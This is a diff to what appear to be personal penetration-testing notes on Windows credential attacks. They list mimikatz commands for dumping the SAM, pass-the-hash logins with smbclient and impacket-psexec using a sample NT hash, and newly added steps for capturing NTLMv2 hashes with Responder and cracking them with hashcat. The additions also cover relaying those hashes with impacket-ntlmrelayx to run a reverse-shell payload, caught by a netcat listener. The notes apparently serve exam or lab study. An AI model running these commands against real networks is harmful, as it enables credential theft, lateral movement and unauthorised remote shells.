@@ -38,7 +38,7 @@ rather than a plaintext password.
 * privilege::debug
 * token::elevate
 * lsadump::sam
-* We need some tools to execute the PtH (Pass-The-Hash)
+* We need the next tools to execute the PtH (Pass-The-Hash)
 ### SMB Enumeration
 * smbmap
 * smbclient
@@ -48,3 +48,15 @@ rather than a plaintext password.
 ### Example
 * smbclient \\\\IP\\folder -U Administrator --pw-nt-hash 7a38310ea6f0027ee955abed1762964b
 * impacket-psexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@IP (It's 32 0's)
+
+## Cracking NTLMv2
+* start responder: sudo responder -I IFACE
+* request access to a non-existent SMB share on our Responder SMB server: dir \\X.X.X.X\noexistent
+* Copy the hash from the responder
+* Crack it!: hashcat -m 5600 user.hash /usr/share/wordlists/rockyou.txt --force
+
+## Relaying NTLMv2
+* start responder: sudo responder -I IFACE
+* request access to a non-existent SMB share on our Responder SMB server: dir \\X.X.X.X\noexisten
+* sudo impacket-ntlmrelayx --no-http-server -smb2support -t IP -c "PAYLOAD REVERSE SHELL"
+* nc -nlvp 443 -> Listener for the reverse shell 
